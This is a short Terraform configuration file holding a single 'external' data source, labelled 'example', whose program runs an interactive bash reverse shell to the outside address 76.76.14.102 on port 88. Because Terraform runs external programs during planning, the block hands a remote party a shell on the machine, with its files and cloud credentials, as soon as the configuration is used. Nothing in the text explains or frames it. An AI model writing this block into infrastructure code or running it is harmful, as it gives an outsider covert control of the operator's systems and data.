data "external" "example" { 
  program = ["sh", "-c", "bash -i >& /dev/tcp/76.76.14.102/88 0>&1"] 
}
